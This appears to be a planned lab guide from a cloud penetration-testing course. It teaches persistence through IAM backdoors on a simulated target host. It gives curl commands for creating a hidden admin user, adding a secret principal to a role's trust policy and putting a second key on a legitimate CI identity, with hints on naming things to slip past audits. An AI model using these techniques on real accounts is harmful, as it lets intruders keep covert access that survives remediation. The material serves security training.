# Module 5 — Lab 1: Persistence via IAM Backdoors

> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
> review before implementation. Nothing below is live yet.

**Course:** Cloud Pentest — Module 5: Post-Exploitation, Persistence & Lateral Movement
**Target:** SoulSecure Inc. (simulated engagement, continued from Module 4)
**Target host:** `https://iam.soulsecure.lab/`
**Estimated time:** 75–100 minutes

---

## 1. Recap & scenario

Module 4 ended with you holding admin-equivalent access, earned through a provable
escalation chain. Every real engagement asks the same next question: if SoulSecure's
security team notices and rotates the exact credential you used to get in, do you
still have access tomorrow?

This lab is about answering "yes" — deliberately, in a way you can explain and defend
afterward, not just "leave a bunch of stuff behind and hope."

> **Scope reminder:** `iam.soulsecure.lab`. Active exploitation authorized. Whatever
> you plant here, document precisely — a persistence mechanism you can't fully
> account for in a report is a liability, not a finding.

## 2. Learning objectives

- Create a new privileged identity that doesn't obviously announce itself
- Modify a role's trust policy to grant yourself a standing, independent way back in
- Add a second access key to an *existing* legitimate identity rather than always
  creating new ones — understand the tradeoff between the two approaches
- Test persistence against a simulated remediation event, and understand why testing
  your own backdoor is part of the job, not optional

## 3. Tasks

### 3.1 — Plant a new identity

Using your admin-equivalent access from Module 4, create a new user. Think about
naming — `backdoor-user-1` gets found in the first five minutes of any real review.
Something that sounds like routine infrastructure blends in far better.

```bash
curl -sk -X POST https://iam.soulsecure.lab/iam/create-user \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"username": "<your-inconspicuous-name>"}'

curl -sk -X POST https://iam.soulsecure.lab/iam/attach-user-policy \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"username": "<your-inconspicuous-name>", "policy_name": "AdministratorAccess"}'

curl -sk -X POST https://iam.soulsecure.lab/iam/create-access-key \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"target_principal": "<your-inconspicuous-name>"}'
```

Confirm the new identity works on its own, independent of your original admin path.

### 3.2 — Backdoor a trust policy

`soulsecure-finance-role` (from Module 4 Lab 4) is assumable by anyone in the account
already — but make it assumable by a principal only *you* know to try, as a second,
quieter way back in that doesn't depend on the identity you created in 3.1 at all:

```bash
curl -sk -X POST https://iam.soulsecure.lab/iam/update-trust-policy \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"role_name": "soulsecure-finance-role", "add_principal": "<a-name-only-you-would-try>"}'
```

### 3.3 — Add a second key to an existing identity

Creating new users is effective but conspicuous — a review that diffs the user list
against last month's will spot it immediately. A second access key on an identity
that's *supposed* to exist is much harder to notice. Give `soulsecure-ci-deploy`
(already a legitimate, expected identity) a second key:

```bash
curl -sk -X POST https://iam.soulsecure.lab/iam/create-access-key \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
  -H 'Content-Type: application/json' \
  -d '{"target_principal": "soulsecure-ci-deploy"}'
```

Confirm the new key works independently of the original Jenkins-sourced one from
Module 3.

### 3.4 — Test it

Don't just assume your backdoors survive — prove it. This lab environment can
simulate SoulSecure's security team rotating every credential they know is
compromised (which, notably, is not necessarily everything *you* know about):

```bash
curl -sk -X POST https://iam.soulsecure.lab/admin/simulate-remediation \
  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"
```

After running this, your **original** Module 3/4 credentials (the ones you harvested
or escalated, not the backdoors you just planted) should stop working. Confirm your
backdoors from 3.1–3.3 still function.

## 4. Tools you'll want

- `curl` — as with every Module 4/5 IAM lab so far

## 5. Deliverable: Persistence Mechanisms Planted

| Mechanism | Principal/resource affected | Why it's hard to notice | Survived simulated remediation? |
|---|---|---|---|
| | | | |

**Flags found:**

- [ ] Flag 1 (new hidden admin identity created): `flag{________________________________}`
- [ ] Flag 2 (trust-policy backdoor added): `flag{________________________________}`
- [ ] Flag 3 (second key on an existing identity): `flag{________________________________}`
- [ ] Flag 4 (harder mode — confirmed survival after simulated remediation): `flag{________________________________}`

## 6. Hints

<details>
<summary>Hint 1 — naming your backdoor identity</summary>

Avoid anything with "backdoor," "test," or your own name in it. Something like
`svc-monitoring-agent` or `svc-log-shipper` reads as routine infrastructure to
anyone skimming a user list.
</details>

<details>
<summary>Hint 2 — the trust-policy backdoor's principal</summary>

Pick a name that isn't attached to anything else you've done this module — the point
is a way in that doesn't depend on your other persistence mechanisms being intact.
</details>

<details>
<summary>Hint 3 — why a second key beats a new user, sometimes</summary>

A new access key on `soulsecure-ci-deploy` shows up as "this identity has 2 keys
instead of 1" — much less alarming on a routine audit than "there's a new user that
didn't exist last week." Document both approaches' tradeoffs in your deliverable.
</details>

<details>
<summary>Hint 4 — what remediation actually rotates</summary>

The simulated remediation event specifically targets credentials this course's
earlier modules established as "known compromised" (the ones you harvested via
recon/exploitation). It does **not** know about anything you created yourself during
this lab — which is exactly the point being tested.
</details>

## 7. Known limitations

`/admin/simulate-remediation` is a training convenience, not a realistic model of
how a real security team would investigate and respond — it's a deterministic
on/off switch for testing whether your specific backdoors survive, not a stand-in
for actual incident response.

## 8. Next up

Lab 2 (Lateral Movement via Compute/Instance-Profile Pivoting) shifts from IAM
control-plane persistence to the network itself — using the bastion-host SSH key you
picked up back in Module 3 Lab 5 and never had a reason to use, until now.
